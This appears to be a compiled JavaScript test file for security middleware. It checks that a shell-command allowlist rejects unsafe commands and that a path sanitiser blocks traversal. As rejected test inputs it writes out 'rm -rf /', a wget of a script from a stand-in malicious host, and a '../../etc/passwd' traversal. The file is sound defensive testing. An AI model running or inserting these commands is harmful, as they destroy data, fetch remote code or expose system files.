"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const node_assert_1 = __importDefault(require("node:assert"));
const node_test_1 = require("node:test");
const auth_1 = require("../middleware/auth");
(0, node_test_1.test)('Security Protection: validateShellCommand allowlist checks', () => {
    node_assert_1.default.strictEqual((0, auth_1.validateShellCommand)('npm run build'), true);
    node_assert_1.default.strictEqual((0, auth_1.validateShellCommand)('git pull origin main'), true);
    node_assert_1.default.strictEqual((0, auth_1.validateShellCommand)('certbot renew'), true);
    node_assert_1.default.strictEqual((0, auth_1.validateShellCommand)('rm -rf /'), false);
    node_assert_1.default.strictEqual((0, auth_1.validateShellCommand)('wget http://malicious.com/script.sh'), false);
});
(0, node_test_1.test)('Security Protection: sanitizePath path traversal protection', () => {
    const base = '/var/www';
    node_assert_1.default.strictEqual((0, auth_1.sanitizePath)(base, 'site1/index.html'), '/var/www/site1/index.html');
    node_assert_1.default.throws(() => {
        (0, auth_1.sanitizePath)(base, '../../etc/passwd');
    }, /Path traversal attempt detected/);
});
